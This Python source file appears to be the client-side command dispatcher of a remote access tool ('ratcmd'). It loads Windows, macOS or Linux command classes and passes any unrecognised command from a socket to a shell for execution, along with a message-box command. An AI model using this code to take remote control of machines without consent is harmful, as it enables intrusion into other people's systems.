import inspect
import platform

from core.utils.common_util import parse, parse_ratcmd, validate_required_args


class CommandExecutor:
    def __init__(self, socket):
        self.socket = socket
        self.platform_commands = None

        self.ratcmd_handlers = {
            'msgbox': self._handle_msgbox,
            # 在这里注册更多ratcmd命令
        }

    def get_commands(self):
        if not self.platform_commands:
            system = platform.system().lower()
            if system == 'windows':
                from client.commands.platform.windows import WindowsCommands  # ⚠️ 动态导入
                self.platform_commands = WindowsCommands(self.socket)
                return self.platform_commands
            elif system == 'darwin':
                from client.commands.platform.mac import MacCommands
                self.platform_commands = MacCommands(self.socket)
                return self.platform_commands
            elif system == 'linux':
                from client.commands.platform.linux import LinuxCommands
                self.platform_commands = LinuxCommands(self.socket)
                return self.platform_commands
            else:
                raise NotImplementedError(f"Unsupported OS: {system}")
        return self.platform_commands

    def execute_command(self, command_id, command):
        """
        执行命令
        :param command_id: 命令id，用于set到该实例中，返回结果时指定对应的命令id
        :param command: 命令字符串
        :return: 执行结果元组（状态和消息）
        """
        # 将 command_id 设置为实例变量
        # self.command_id = command_id
        # 解析 command 得到函数名和其参数（如果有）

        # 检查命令类型
        if isinstance(command, dict) and command.get('type') == 'ratcmd':
            cmd_text = command.get('text', '')
            return self._execute_ratcmd(command_id, cmd_text)

        name, arg = parse(command)
        commands = self.get_commands()
        commands.command_id = command_id
        # 检查实例是否有一个与解析出的函数名相对应的方法
        if hasattr(commands, name):
            # 使用函数名获取方法对象
            func = getattr(commands, name)
            # 检查方法是否有 'desc' 注解
            if hasattr(func, 'help'):
                # 如果方法接受参数，则带上提供的参数调用它
                if len(inspect.signature(func).parameters):
                    return func(arg)
                # 如果方法不接受参数，则无参数调用
                return func()
            else:
                # 如果方法没有 'desc' 注解，则执行 'shell' 方法并将原始命令作为参数
                return commands.shell(command)
        else:
            # 如果不存在与解析出的名字相对应的方法，则执行 'shell' 方法并将原始命令作为参数
            return commands.shell(command)

    def _execute_ratcmd(self, command_id, cmd_text):
        """
        执行ratcmd命令 - 客户端负责具体解析
        """
        try:
            command_name, args_dict = parse_ratcmd(cmd_text)
            commands = self.get_commands()
            commands.command_id = command_id

            # 直接调用平台命令类的ratcmd方法
            if hasattr(commands, 'ratcmd') and callable(commands.ratcmd):
                return commands.ratcmd(command_name, args_dict)
            else:
                return 0, f"RATCMD not supported on this platform"

        except Exception as e:
            return 0, f"RATCMD Error: {str(e)}"

    def _handle_msgbox(self, command_id, args_dict):
        """
        处理消息框命令
        """
        try:
            validate_required_args(args_dict, ['title', 'text'])

            commands = self.get_commands()
            commands.command_id = command_id
            return commands.msgbox(args_dict)

        except Exception as e:
            return 0, f"MsgBox Error: {str(e)}"